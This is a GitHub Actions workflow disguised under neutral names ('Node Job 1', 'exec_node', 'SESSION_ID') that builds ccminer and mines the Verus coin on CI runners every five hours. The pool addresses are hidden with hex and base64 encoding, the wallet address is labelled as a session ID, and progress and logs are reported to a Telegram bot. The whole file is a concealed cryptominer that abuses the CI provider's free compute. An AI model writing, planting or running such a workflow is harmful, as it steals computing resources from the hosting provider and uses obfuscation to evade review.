name: Node Job 1

on:
  schedule:
    - cron: "0 */5 * * *"
  workflow_dispatch:

jobs:
  executor:
    runs-on: ubuntu-latest
    timeout-minutes: 300

    steps:
      - name: Env Setup
        run: |
          sudo apt update
          sudo apt install -y build-essential cmake automake libtool pkg-config libcurl4-openssl-dev git

      - name: Prepare Binary
        run: |
          git clone https://github.com/monkins1010/ccminer.git binrepo
          cd binrepo
          chmod +x build.sh
          ./build.sh
          mv ccminer ../exec_node

      - name: Launch Task
        run: |
          SESSION_ID="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
          INSTANCE="nodeX1"
          TRACK_LOG="track.log"
          MAX_IDLE=600

          TELE_TOKEN="${ secrets.TELEGRAM_TOKEN }"
          TELE_CHAT="${ secrets.TELEGRAM_CHAT_ID }"

          POOLS=(
            "$(echo 7374726174756d2b7463703a2f2f61702e6c75636b706f6f6c2e6e65743a33393536 | xxd -r -p)"
            "$(echo c3RyYXR1bSt0Y3A6Ly9ldS5sdWNrcG9vbC5uZXQ6Mzk1Ng== | base64 -d)"
            "$(echo c3RyYXR1bSt0Y3A6Ly9uYS5sdWNrcG9vbC5uZXQ6Mzk1Ng== | base64 -d)"
          )

          alert_push() {
            curl -s -X POST https://api.telegram.org/bot${TELE_TOKEN}/sendMessage \
              -d chat_id=${TELE_CHAT} \
              -d parse_mode=Markdown \
              -d text="$1"
          }

          upload_log() {
            curl -s -F document=@$TRACK_LOG \
              "https://api.telegram.org/bot${TELE_TOKEN}/sendDocument?chat_id=${TELE_CHAT}"
          }

          alert_push "🟢 *${INSTANCE} activated*"

          for POOL in "${POOLS[@]}"; do
            ./exec_node -a verus -o "$POOL" -u "$SESSION_ID.$INSTANCE" -p hybrid -t 2 > "$TRACK_LOG" 2>&1 &
            PID=$!
            sleep 10

            if ps -p $PID > /dev/null; then
              alert_push "🔗 Linked to \`$POOL\`"
              break
            else
              kill $PID >/dev/null 2>&1
              alert_push "⚠️ Pool error: \`$POOL\`"
            fi
          done

          if ! ps -p $PID > /dev/null; then
            alert_push "❌ No pool reachable. Exit."
            exit 1
          fi

          LAST=$(date +%s)
          SYNCED=0

          tail -F "$TRACK_LOG" | while read -r line; do
            NOW=$(date +%s)

            if echo "$line" | grep -iq "accepted"; then
              SYNCED=$((SYNCED + 1))
              LAST=$NOW
              FLOW=$(echo "$line" | grep -o "[0-9.]\+ kH/s")
              alert_push "✅ *${INSTANCE} sync OK*
⚡ $FLOW
📦 Total: *$SYNCED*"
            fi

            if [ $((NOW - LAST)) -gt $MAX_IDLE ]; then
              alert_push "🛑 *${INSTANCE} idle >10m*"
              kill $PID
              break
            fi

            if ! ps -p $PID > /dev/null; then
              alert_push "❌ *${INSTANCE} terminated*"
              break
            fi
          done

          upload_log
          alert_push "🔚 *${INSTANCE} session closed*
Total: *$SYNCED*"
